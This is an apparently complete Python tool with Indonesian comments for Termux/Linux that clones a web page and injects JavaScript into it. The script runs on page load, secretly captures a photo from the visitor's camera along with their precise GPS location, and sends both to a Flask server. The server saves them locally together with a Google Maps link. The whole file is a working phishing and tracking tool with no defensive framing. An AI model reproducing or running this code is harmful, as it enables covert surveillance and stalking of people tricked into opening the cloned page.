#!/usr/bin/env python3
# lang: Python 3, file: say.py, target: Termux / Linux
# jalankan: python say.py
# dep: flask requests (pip install flask requests)

import os
import sys
import base64
import datetime
import threading
import webbrowser

try:
    from flask import Flask, request, jsonify, send_from_directory
except ImportError:
    print("[!] Flask belum ada. Install dulu: pip install flask requests")
    sys.exit(1)

try:
    import requests as req_lib
except ImportError:
    req_lib = None

# ------------------------------------------------------------------ #
#  BANNER
# ------------------------------------------------------------------ #
BANNER = r"""
  ____                ____ _                         
 / ___|  __ _ _   _  / ___| |__   ___  ___  ___  ___ 
 \___ \ / _` | | | || |   | '_ \ / _ \/ _ \/ __|/ _ \
  ___) | (_| | |_| || |___| | | |  __/  __/\__ \  __/
 |____/ \__,_|\__, | \____|_| |_|\___|\___||___/\___|
              |___/                                   
  tools lokasi + foto — simpan lokal
"""

# ------------------------------------------------------------------ #
#  JS INJECT — ambil lokasi + foto, kirim ke /capture
# ------------------------------------------------------------------ #
INJECT_JS = """
<script>
(function(){
  var sent = false;

  function sendData(lat, lon, accuracy, photoB64) {
    if (sent) return;
    sent = true;
    fetch('/capture', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        lat: lat, lon: lon,
        accuracy: accuracy,
        photo: photoB64 || null
      })
    });
  }

  // --- ambil lokasi ---
  function grabLocation(photoB64) {
    if (!navigator.geolocation) {
      sendData(null, null, null, photoB64);
      return;
    }
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        sendData(
          pos.coords.latitude,
          pos.coords.longitude,
          pos.coords.accuracy,
          photoB64
        );
      },
      function() { sendData(null, null, null, photoB64); },
      {enableHighAccuracy: true, timeout: 10000}
    );
  }

  // --- ambil foto via kamera ---
  function grabPhoto() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
      grabLocation(null);
      return;
    }
    navigator.mediaDevices.getUserMedia({video: {facingMode: 'environment'}, audio: false})
      .then(function(stream) {
        var video = document.createElement('video');
        video.srcObject = stream;
        video.setAttribute('playsinline', '');
        video.play();
        video.addEventListener('loadeddata', function() {
          var canvas = document.createElement('canvas');
          canvas.width  = video.videoWidth  || 640;
          canvas.height = video.videoHeight || 480;
          canvas.getContext('2d').drawImage(video, 0, 0);
          stream.getTracks().forEach(function(t){ t.stop(); });
          var b64 = canvas.toDataURL('image/jpeg', 0.85).split(',')[1];
          grabLocation(b64);
        });
      })
      .catch(function() { grabLocation(null); });
  }

  // mulai setelah halaman load
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', grabPhoto);
  } else {
    grabPhoto();
  }
})();
</script>
"""

# ------------------------------------------------------------------ #
#  HELPER: clone URL
# ------------------------------------------------------------------ #
def clone_url(url: str) -> str:
    if req_lib is None:
        raise RuntimeError("requests belum install: pip install requests")
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 "
                      "Chrome/112.0.0.0 Mobile Safari/537.36"
    }
    r = req_lib.get(url, headers=headers, timeout=15)
    r.raise_for_status()
    return r.text


def inject_into_html(html: str) -> str:
    """Sisipkan JS sebelum </body>, atau di akhir kalau tidak ada tag itu."""
    lower = html.lower()
    idx = lower.rfind("</body>")
    if idx != -1:
        return html[:idx] + INJECT_JS + html[idx:]
    return html + INJECT_JS


# ------------------------------------------------------------------ #
#  SIMPAN HASIL
# ------------------------------------------------------------------ #
def save_result(data: dict):
    os.makedirs("hasil", exist_ok=True)
    ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")

    lat  = data.get("lat")
    lon  = data.get("lon")
    acc  = data.get("accuracy")
    foto = data.get("photo")

    # tulis koordinat
    loc_path = os.path.join("hasil", f"lokasi_{ts}.txt")
    with open(loc_path, "w") as f:
        if lat and lon:
            f.write(f"Latitude  : {lat}\n")
            f.write(f"Longitude : {lon}\n")
            f.write(f"Accuracy  : {acc} meter\n")
            f.write(f"Maps      : https://maps.google.com/?q={lat},{lon}\n")
        else:
            f.write("Lokasi tidak berhasil didapat.\n")
    print(f"[+] Lokasi disimpan  → {loc_path}")

    # tulis foto
    if foto:
        try:
            img_data = base64.b64decode(foto)
            img_path = os.path.join("hasil", f"foto_{ts}.jpg")
            with open(img_path, "wb") as f:
                f.write(img_data)
            print(f"[+] Foto disimpan    → {img_path}")
        except Exception as e:
            print(f"[!] Gagal simpan foto: {e}")
    else:
        print("[!] Foto tidak berhasil diambil.")


# ------------------------------------------------------------------ #
#  FLASK APP
# ------------------------------------------------------------------ #
app = Flask(__name__)
_page_html = ""   # HTML yang sudah di-inject, diisi sebelum server jalan


@app.route("/")
def index():
    return _page_html


@app.route("/capture", methods=["POST"])
def capture():
    data = request.get_json(silent=True) or {}
    save_result(data)
    return jsonify({"ok": True})


# endpoint fallback untuk aset relatif (gambar, css, js) dari dir kerja
@app.route("/<path:filename>")
def static_files(filename):
    return send_from_directory(".", filename)


# ------------------------------------------------------------------ #
#  MAIN
# ------------------------------------------------------------------ #
def main():
    global _page_html

    print(BANNER)
    print("=" * 55)
    print(" Pilih mode template:")
    print("  [1] Clone dari URL")
    print("  [2] Pakai file HTML lokal")
    print("=" * 55)

    while True:
        pilihan = input("\n Masukkan pilihan (1/2): ").strip()
        if pilihan in ("1", "2"):
            break
        print("[!] Masukkan 1 atau 2.")

    raw_html = ""

    if pilihan == "1":
        url = input(" Masukkan URL template : ").strip()
        if not url.startswith("http"):
            url = "https://" + url
        print(f"[*] Cloning {url} ...")
        try:
            raw_html = clone_url(url)
            print("[+] Clone berhasil.")
        except Exception as e:
            print(f"[!] Gagal clone: {e}")
            sys.exit(1)

    else:
        path = input(" Masukkan path file HTML : ").strip().strip('"').strip("'")
        if not os.path.isfile(path):
            print(f"[!] File tidak ditemukan: {path}")
            sys.exit(1)
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            raw_html = f.read()
        print("[+] File berhasil dibaca.")

    _page_html = inject_into_html(raw_html)
    print("[+] JS injeksi berhasil disisipin.")

    port = 8080
    # cari port kosong kalau 8080 bentrok
    import socket
    while True:
        with socket.socket() as s:
            if s.connect_ex(("127.0.0.1", port)) != 0:
                break
            port += 1

    local_url = f"http://127.0.0.1:{port}"
    print(f"\n[+] Server jalan di  : {local_url}")
    print(f"[+] Hasil tersimpan  : ./hasil/")
    print(f"[*] Tekan Ctrl+C untuk berhenti.\n")

    # buka browser otomatis (opsional, skip kalau gagal)
    try:
        threading.Timer(1.0, lambda: webbrowser.open(local_url)).start()
    except Exception:
        pass

    app.run(host="0.0.0.0", port=port, debug=False)


if __name__ == "__main__":
    main()
